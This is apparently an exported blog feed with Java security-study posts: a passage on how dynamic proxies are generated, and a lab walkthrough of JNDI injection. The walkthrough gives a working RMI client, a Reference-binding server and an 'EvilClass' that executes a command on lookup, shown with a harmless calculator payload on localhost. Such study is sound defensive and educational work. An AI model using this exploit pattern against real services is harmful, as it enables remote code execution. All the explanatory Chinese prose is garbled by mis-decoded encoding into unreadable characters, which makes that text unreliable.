<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.dynamicproxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyInterfaceImpl</span> <span class="keyword">implements</span> <span class="title class_">ProxyInterface</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;my name is armandhe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶åå®šä¹‰æˆ‘ä»¬çš„InnovcationHandlerå®ä¾‹ï¼Œè¿™é‡Œæˆ‘æŠŠè°ƒç”¨ç±»å†™åœ¨ä¸€èµ·äº†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.dynamicproxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ProxyInterfaceImpl</span> <span class="variable">proxyInterface</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProxyInterfaceImpl</span>();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ProxyInterface.class.getClassLoader();</span><br><span class="line">        <span class="type">ProxyInterface</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> (ProxyInterface) Proxy.newProxyInstance(classLoader, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ProxyInterface.class&#125;, <span class="keyword">new</span> <span class="title class_">DynamicProxyHandler</span>(proxyInterface));</span><br><span class="line">        proxyInstance.printName();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DynamicProxyHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object proxyedClass;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DynamicProxyHandler</span><span class="params">(Object proxyedClass)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.proxyedClass =proxyedClass;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ·»åŠ çš„å‰ç½®å†…å®¹&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">invoke</span> <span class="operator">=</span> method.invoke(proxyedClass, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;æ·»åŠ çš„å‰ç½®å†…å®¹&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> invoke;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ³¨æ„åˆ°æˆ‘ä»¬å®šä¹‰çš„å¤„ç†å™¨å¿…é¡»å®ç°InvocationHandler, Serializableä¸¤ä¸ªæ¥å£ï¼Œä¸€ä¸ªæ˜¯å¤„ç†å™¨ï¼Œä¸€ä¸ªæ˜¯ååºåˆ—åŒ–æ ‡è¯†ï¼Œç„¶åæˆ‘ä»¬è¿˜å¾—é‡å†™å…¶invokeæ–¹æ³•ã€‚</p>
<p>ç°åœ¨ä¸‡äº‹ä¿±å¤‡åªæ¬ ä¸œé£ï¼Œæˆ‘ä»¬ç›´æ¥æ‰“æ–­ç‚¹å¼€å§‹è°ƒè¯•<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1c72682141efd09ea30c0cc201201a5a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨java.lang.reflect.Proxy#newProxyInstanceæ–¹æ³•ä¸­é¦–å…ˆé€šè¿‡java.lang.reflect.Proxy#getProxyClass0æ–¹æ³•è·å–ä¸€ä¸ªProxy çš„Classå®ä¾‹ï¼Œç„¶åä¼ å…¥ä¸€ä¸ªInnovacationçš„Classå®ä¾‹å¯¹è±¡è·å–åˆ°å¯¹åº”çš„æ„é€ æ–¹æ³•ï¼Œæœ€ååˆ©ç”¨åå°„è°ƒç”¨è·å–åˆ°ä¸€ä¸ªæˆ‘ä»¬è¢«ä»£ç†ç±»çš„Proxyç±»å®ä¾‹ã€‚<br>æ‰€ä»¥æˆ‘ä»¬ä»£ç†ç±»çš„æ‰€æœ‰ç”Ÿæˆé€»è¾‘éƒ½åœ¨getProxyClass0è¿™ä¸ªæ–¹æ³•ä¸­<br>è¯¥æ–¹æ³•é¦–å…ˆä¼šä»proxyClassCacheç¼“å­˜ä¸­æ£€æŸ¥è¢«ä»£ç†ç±»çš„ä»£ç†ç±»å®ä¾‹æ˜¯å¦å·²ç»ç”Ÿæˆäº†ï¼Œå¦‚æœç”Ÿæˆåˆ™ç›´æ¥è¿”å›è¯¥å®ä¾‹ï¼Œå¦åˆ™ä¼šè°ƒç”¨subKeyFactory.applyæ–¹æ³•è·å–subkey(å¹²å•¥çš„æ²¡çœ‹æ‡‚)ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªFactoryï¼ˆåªæœ‰ä¸€äº›èµ‹å€¼æ“ä½œï¼‰ï¼Œç„¶ååˆ¤æ–­supplieræ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºåˆ™ç»§ç»­å¾ªç¯ï¼Œå¹¶ä¸ºå…¶èµ‹å€¼ä¸ºfactoryï¼Œè¿™æ—¶å€™å…¶å°±ä¸ä¸ºç©ºäº†ç„¶åä¼šè°ƒç”¨åˆ°supplier.get()æ–¹æ³•<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5511f43bd8c13aadcfc270ddea84d371.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œé¦–å…ˆè¿˜æ˜¯æ£€æŸ¥subkeyæ˜¯å¦æœ‰ç¼“å­˜ï¼Œè¿™æ—¶å€™å¾ˆæ˜æ˜¾æ˜¯æœ‰çš„ä¸”è¿”å›ä¸€ä¸ªsupplierå¯¹è±¡ï¼Œä¸Šé¢æåˆ°äº†ä¼šå°†Factoryèµ‹å€¼ä¸ºsupplierï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªåˆ¤æ–­å‡ï¼Œç›´æ¥åˆ°æ–­ç‚¹å¤„ï¼Œä¼šè°ƒç”¨valueFactory.applyï¼ŒvalueFactoryä¸ºä¸€ä¸ªProxyClassFactoryå¯¹è±¡ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e61a4eddece2289449391e21268b45aa.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œç›´æ¥è·å–äº†å½“å‰æ¥å£çš„Classå®ä¾‹<br><img src="https://i-blog.csdnimg.cn/blog_migrate/687766e458077b567aa3400cb1839c39.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œè®¾ç½®äº†ç”Ÿæˆçš„ä»£ç†ç±»çš„åŒ…å<br><img src="https://i-blog.csdnimg.cn/blog_migrate/90fcd9add1996c0b47973552b627d1a4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œè®¾ç½®ç±»ä»£ç†ç±»çš„å…¨ç±»åï¼Œå¯ä»¥è§‚å¯Ÿå¯¼ç”Ÿæˆçš„ä»£ç†ç±»ç±»åå·²$ProxyåŠ ä¸€ä¸ªæ•°å­—å¼€å¤´ï¼Œæ•°å­—æ˜¯é€’å¢çš„ä»¥æˆ‘ä»¬ä¼ å…¥çš„æ¥å£æ•°ä¸ºå‡†<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3b46db8cb6bfd2dbb37bf90036a80fcd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åä¼šè°ƒç”¨sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[], int)ç”Ÿæˆä»£ç†ç±»çš„å­—èŠ‚ç æ–‡ä»¶ï¼Œè¿™é‡Œé¢å…¨æ˜¯ç›´æ¥æ“ä½œå­—èŠ‚ç ï¼Œå®åœ¨ç‰›çš®ï¼Œç„¶åè°ƒç”¨java.lang.reflect.Proxy#defineClass0é“¾æ¥ç±»å®Œæˆç±»åŠ è½½ï¼ŒdefineClass0æ˜¯ä¸€ä¸ªæœ¬åœ°æ–¹æ³•ï¼Œç†Ÿæ‚‰javaç±»æ¶å­åº”è¯¥çŸ¥é“ï¼Œåœ¨é»˜è®¤çš„ç±»åŠ è½½å™¨ä¸­ä¹Ÿæ˜¯ä½¿ç”¨çš„è¯¥æ–¹æ³•é“¾æ¥ç±»ã€‚
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://img-blog.csdnimg.cn/18f2ec10dc1b4cebb1b6e4f756b015e0.png)
sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[], int)é¦–å…ˆåœ¨åŠ è½½è¿‡ç¨‹ä¸­å°±å®Œæˆäº†ä»£ç†ç±»çš„ç”Ÿæˆï¼Œè¿™å¾ˆæ˜æ˜¾æ˜¯ä¸€ä¸ªé¥¿æ±‰å¼çš„å•ä¾‹æ¨¡å¼ã€‚è°ƒç”¨æ„é€ æ–¹æ³•å°±è¿›è¡Œäº†ä¸€äº›èµ‹å€¼æ“ä½œã€‚<br>ç„¶åè°ƒç”¨sun.misc.ProxyGenerator#generateClassFileæ–¹æ³•æœ€ç»ˆå®ç°ç±»åŠ è½½ï¼Œç„¶åä¼šsaveGeneratedFilesæ˜¯å¦ä¿å­˜ç”Ÿæˆçš„ä»£ç†ç±»æ–‡ä»¶ï¼Œè¿™ä¸ªå€¼é€šè¿‡è®¾ç½®ç³»ç»Ÿå±æ€§<code>sun.misc.ProxyGenerator.saveGeneratedFiles</code>è®¾ç½®</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/86685f77e38e00e4beaa67adc6cd26a4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/1ec4f936c87115d5652fdcaeaafc6c13.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä»ä¸Šåˆ°ä¸‹ä¸€æ¬¡å®Œæˆå°†hashcode equals toStringæ–¹æ³•æ·»åŠ åˆ°proxyMethodsä¸­ï¼Œå°†ä»£ç†æ–¹æ³•æ·»åŠ åˆ°sigmethodsä¸­<br>å°†è¢«ä»£ç†ç±»æ–¹æ³•åŠ å…¥åˆ°proxyMethodsä¸­<br>æ ¡éªŒæ–¹æ³•è¿”å›å€¼ç±»å‹<br>æ·»åŠ æ„é€ æ–¹æ³•<br>ç„¶åå°±æ˜¯ä¸€æ³¢æ“ä½œå­—èŠ‚ç çš„é€†å¤©æ“ä½œã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>åŠ¨æ€ä»£ç†</tag>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>JNDIæ³¨å…¥å†ç†è§£</title>
    <url>/archives/29b6e7bf.html</url>
    <content><![CDATA[<p>å—¯ï¼Œæ„Ÿè§‰ä»¥å‰å¯¹è¿™ä¸ªæ¦‚å¿µçš„ç†è§£ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œä»Šå¤©æŠ½äº†æ—¶é—´å†å­¦ä¹ äº†å­¦ä¹ ã€‚</p>
<p>JNDIæä¾›äº†ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£å±è”½äº†ä¸€äº›åè®®è´Ÿè½½çš„è°ƒç”¨ä¸ä½¿ç”¨è¿‡ç¨‹ï¼Œå¦‚RMIã€LDAPã€COBRAç­‰ï¼Œä¸»è¦åŠŸèƒ½æ˜¯å®ç°äº†è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œé’ˆå¯¹JNIDçš„æ”»å‡»ä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸¤ç§ï¼Œä¸€ç§æ˜¯æ³¨å†Œåœ¨è¿œç¨‹çš„å¯¹è±¡ç”±ä¸€äº›å±é™©çš„æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥ç›´æ¥ä½¿ç”¨æ³¨å†Œä¸­å…´å¯¹å¤–æš´éœ²çš„æ¥å£è°ƒç”¨è¿™äº›å±é™©çš„æ–¹æ³•æ¥å®ç°æ”»å‡»ï¼Œä¸€ç±»æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨å®¢æˆ·ç«¯å‘æ³¨å†Œä¸­å¿ƒç›´æ¥æ³¨å†Œä¸€ä¸ªæ¶æ„å¯¹è±¡ï¼Œå› ä¸ºå¯¹è±¡åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ—¶åºåˆ—åŒ–ä¼ è¾“çš„ï¼Œé‚£ä¹ˆæ³¨å†Œä¸­å¿ƒå†åŠ è½½è¯¥å¯¹è±¡çš„æ—¶å€™ä¼šè¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬çš„æ¶æ„å¯¹è±¡çš„é™æ€ä»£ç å—ä¸­æœ‰ä¸€äº›å±é™©æ“ä½œé‚£ä¹ˆä¾¿ä¼šç›´æ¥è¢«æ‰§è¡Œï¼Œå› ä¸ºé™æ€ä»£ç å—ä¸­çš„æ–¹æ³•æ˜¯åœ¨ç±»åŠ è½½è¿‡ç¨‹ä¸­è¢«è°ƒç”¨çš„ï¼Œä¸”åªä¼šè°ƒç”¨ä¸€æ¬¡ã€‚<br>å…³äºç¬¬ä¸€ç§æƒ…å†µï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œåªè¦æˆ‘ä»¬èƒ½å¤Ÿè¿œç¨‹è°ƒç”¨æ¥å£ä¾¿èƒ½å®Œæˆæ”»å‡»ï¼Œå½“ç„¶æ˜¯åœ¨ä½ çŸ¥é“å¯¹æ–¹æ³¨å†Œäº†ä»€ä¹ˆå±é™©å¯¹è±¡çš„åŸºç¡€ä¸Šã€‚ç¬¬äºŒç§æƒ…å†µä¹Ÿåˆ†å¤šç§æƒ…å†µï¼Œä¸€æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥å‘è¿œç¨‹æ³¨å†Œæ¶æ„å¯¹è±¡ã€‚äºŒæ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨JNDIçš„åŠ¨æ€ç±»åŠ è½½æœºåˆ¶å®Œæˆæ”»å‡»ï¼Œä¸€æ˜¯åˆ©ç”¨CodeBaseæœºåˆ¶ï¼Œå¦‚æœå®¢æˆ·ç«¯çš„lookupå‚æ•°å†…å®¹å¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥è‡ªè¡Œæ­å»ºä¸€ä¸ªæ³¨å†Œä¸­å¿ƒï¼Œæ³¨å†Œæ¶æ„ç±»ã€‚é‚£ä¹ˆå®¢æˆ·ç«¯åœ¨è°ƒç”¨çš„æ—¶å€™å°±ä¼šè°ƒç”¨åˆ°æˆ‘ä»¬çš„æ¶æ„å¯¹è±¡ï¼Œä½†æ˜¯è¿™æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœæ˜¯æˆ‘ä»¬è‡ªè¡Œæ³¨å†Œçš„æ¶æ„å¯¹è±¡ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯å¦‚æœæ²¡æœ‰è¿™ä¸ªæ¶æ„ç±»ï¼Œå®¢æˆ·ç«¯ä¹Ÿæ˜¯ä¸ä¼šååºåˆ—åŒ–æˆåŠŸçš„ï¼Œåˆ©ç”¨CodeBaseæœºåˆ¶æˆ‘ä»¬å¯ä»¥åœ¨æœåŠ¡ç«¯æŒ‡å®šæ¶æ„ç±»çš„åŠ è½½åœ°å€ï¼Œå½“å®¢æˆ·ç«¯è¯·æ±‚è¯¥æ¶æ„å¯¹è±¡çš„æ—¶å€™ï¼Œå®¢æˆ·ç«¯ä¼šä¸€å¹¶å°†CodeBaseæŒ‡å®šçš„åœ°å€å‘é€ä¸ªå®¢æˆ·ç«¯ï¼Œå¦‚æœå®¢æˆ·ç«¯æ²¡æœ‰è¿™ä¸ªæ¶æ„ç±»é‚£ä¹ˆåˆ™ä¼šä½¿ç”¨CodeBaseæŒ‡å®šçš„åœ°å€å»åŠ è½½æ¶æ„ç±»ï¼Œä»è€Œå®Œæˆæ¶æ„ç±»çš„è‡ªåŠ¨è°ƒç”¨ã€‚è¿™é‡Œæ³¨æ„CodeBaseæ˜¯åŒå‘æŒ‡å®šçš„ï¼Œå®¢æˆ·ç«¯å¯ä»¥æŒ‡å®šï¼ŒæœåŠ¡ç«¯ä¹Ÿå¯ä»¥æŒ‡å®šï¼Œå½“ç„¶ä¼˜å…ˆä½¿ç”¨çš„æ˜¯æœåŠ¡ç«¯æŒ‡å®šçš„åœ°å€ã€‚éº»çƒ¦çš„æ˜¯ä¸€äº›ç‰ˆæœ¬çš„JDKæ¨¡å¼ä¸å…è®¸CodeBaseè¿œç¨‹ç±»åŠ è½½ï¼Œè€Œä¸”è¿˜æ¶‰åŠåˆ°javaçš„å®‰å…¨ç®¡ç†å™¨ã€‚å¦ä¸€ç§æƒ…å†µæ˜¯åˆ©ç”¨JNDI Naming Referenceï¼ŒReferenceç±»è¡¨ç¤ºå¯¹å­˜åœ¨äºå‘½å&#x2F;ç›®å½•ç³»ç»Ÿä»¥å¤–çš„å¯¹è±¡çš„å¼•ç”¨ï¼Œå¦‚æœæ³¨å†Œåœ¨æ³¨å†Œä¸­å¿ƒçš„å¯¹è±¡ä¸ºReferenceç±»çš„å­ç±»ï¼Œé‚£ä¹ˆå†å®¢æˆ·ç«¯è·å–åˆ°è¿œç¨‹å¯¹è±¡çš„å­˜æ ¹å®ä¾‹çš„æ—¶å€™å°†ä½¿ç”¨Referenceå¯¹è±¡æŒ‡å®šçš„è¿œç¨‹åœ°å€ä¸ç±»åå»åŠ è½½æ¶æ„ç±»ä»è€Œå®Œæˆæ”»å‡»ï¼Œå¯ä»¥æ³¨æ„åˆ°ï¼Œè¿™ä¸ªæ”»å‡»å‘ç”Ÿåœ¨å®¢æˆ·ç«¯ã€‚å› ä¸ºReferenceæ²¡æœ‰ç»§æ‰¿UnicastRemoteObjectï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹Referenceç±»ä½¿ç”¨ReferenceWrapperå¯¹å…¶è¿›è¡ŒåŒ…è£…ï¼Œç„¶åç»‘å®šåœ¨æ³¨å†Œä¸­å¿ƒä¸­æ‰èƒ½å®ç°è¿œç¨‹è°ƒç”¨ã€‚ä¸¤ç§æƒ…å†µé‡ç‚¹éƒ½æ˜¯éœ€è¦lookupå‡½æ•°å‚æ•°å¯æ§ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥æŒ‡å®šè¿œç¨‹æœåŠ¡å™¨çš„ä½ç½®ï¼Œå½“ç„¶ä½ å¦‚æœå¯ä»¥æ“æ§å¯¹æ–¹è¿œç¨‹æœåŠ¡å™¨åˆå¦è¯´ã€‚<br>è¿™é‡Œæˆ‘ä»¬ä»‹ç»ä¸€ä¸‹é€šè¿‡Referenceç±»æ¥å®ç°JNDIæ³¨å…¥ï¼Œé¦–å…ˆæˆ‘ä»¬å†™ä¸€ä¸ªå®¢æˆ·ç«¯ã€‚</p>
<span id="more"></span>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.jnditest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">lookup</span> <span class="operator">=</span> initialContext.lookup(<span class="string">&quot;rmi://127.0.0.1/hacked&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>System.setProperty(â€œcom.sun.jndi.rmi.object.trustURLCodebaseâ€, â€œtrueâ€);</p>
</blockquote>
<p>è¿™ä¸€è¡Œä»£ç æ˜¯ä¸ºäº†é¿å…é«˜ç‰ˆæœ¬çš„JDKå€¼å…è®¸åœ¨æŒ‡å®šä½ç½®åŠ è½½ç±»çš„ç‰¹æ€§<br>ç„¶åæˆ‘ä»¬å†™ä¸€ä¸ªæœåŠ¡ç«¯</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.jnditest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, MalformedURLException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;com.armandhe.jnditest.EvilClass&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;file://E:\\securityTools\\æºç \\jnditest\\src\\main\\java\\com\\armandhe\\jnditest\\EvilClass.class&quot;</span>;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(className, className, url);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;hacked&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;rmi://127.0.0.1/hacked is working...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æœåŠ¡ç«¯å°±ä¸èµ·httpæœåŠ¡å™¨äº†ï¼Œæˆ‘ä»¬é€šè¿‡fileåè®®å°†è¿œç¨‹ç±»çš„åœ°å€è®¾ç½®ä¸ºæœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œå› ä¸ºæˆ‘çš„å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨åœ¨åŒä¸€å°æœºå™¨ä¸Šï¼Œæ‰€ä»¥è¿™æ ·ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œç„¶åå£°æ˜ä¸€ä¸ªæ³¨å†Œä¸­å¿ƒï¼Œç»‘å®šä¸€ä¸ªç«¯å£ï¼Œå®ä¾‹åŒ–ä¸€ä¸ªReferenceç±»ï¼Œä½¿ç”¨ReferenceWrapperå¯¹å…¶è¿›è¡ŒåŒ…è£…ï¼Œå› ä¸ºå…¶ç»§æ‰¿äº†UnicastRemoteObjectç±»ï¼Œè¿™æ ·æˆ‘ä»¬çš„Referenceæ‰èƒ½è¢«è¿œç¨‹è°ƒç”¨<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3f4e96c56945648fc75944c7e79c003f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>ç„¶åæ˜¯æˆ‘ä»¬çš„æ¶æ„ç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.jnditest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åœ¨è¯¥ç±»ä¸­æˆ‘ä»¬é›†æˆäº†ObjectFactoryç±»ï¼Œé‡å†™äº†å…¶getObjectInstanceæ–¹æ³•ã€‚<br>ç„¶åè®²æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯åˆ†åˆ«è¿è¡Œèµ·æ¥ï¼Œç„¶åæ‰“æ–­ç‚¹è¿›è¡Œè°ƒè¯•<br><img src="https://i-blog.csdnimg.cn/blog_migrate/92ca44c08af8d3f8f8dc95bcbb1dc7f0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é¦–å…ˆè°ƒç”¨çš„æ˜¯InitialContext#lookupæ–¹æ³•ï¼Œè¯¥æ–¹æ³•é¦–å…ˆè°ƒç”¨äº†å…¶é™æ€æ–¹æ³•getURLOrDefaultIniCtxï¼Œè·å–äº†ä¸€ä¸ªContextå¯¹è±¡ï¼Œè¯¥Contextå¯¹è±¡æ˜¯GenericURLContextç±»çš„ä¸€ä¸ªå®ä¾‹ï¼Œç„¶åè°ƒç”¨å…¶lookupæ–¹æ³•ï¼Œå‡ºå…¥jndiè¡¨è¾¾å¼<br><img src="https://i-blog.csdnimg.cn/blog_migrate/dd088615137ff86c90161159605ab82d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åç»§ç»­å¾€ä¸‹èµ°è¿›å…¥åˆ°RegistryContext#lookupæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šè°ƒç”¨decodeObjectæ–¹æ³•å¯¹è¿œç¨‹å¯¹è±¡è¿›è¡Œè§£æï¼Œè¯¥æ–¹æ³•æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯æˆ‘ä»¬è¿œç¨‹è·å–çš„ReferenceWrapperå¯¹è±¡ï¼Œä¸€ä¸ªæ˜¯æˆ‘ä»¬çš„æŸ¥è¯¢nameï¼Œä¹Ÿå°±æ˜¯hacked<br><img src="https://i-blog.csdnimg.cn/blog_migrate/664327f269b07c14eda517690151d4be.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ–¹æ³•ä½“é‡é¦–å…ˆä¼šåˆ¤æ–­æˆ‘ä»¬ä¼ å…¥çš„å¯¹è±¡æ˜¯å¦æ˜¯RemoteReferenceä¸Referenceç±»çš„å®ä¾‹ï¼Œç„¶åè¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ä¸ºReferenceå¯¹è±¡ï¼Œåˆ¤æ–­æ˜¯å¦è®¾ç½®äº†è¿œç¨‹ç±»çš„ä½ç½®ï¼Œä»¥åŠè¯¥åœ°å€æ˜¯å¦æ˜¯å¯ä¿¡çš„CodeBaseåœ°å€ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬æœ€å¼€å§‹è¦è®¾ç½®com.sun.jndi.rmi.object.trustURLCodebaseä¸ºtrueçš„åŸå› 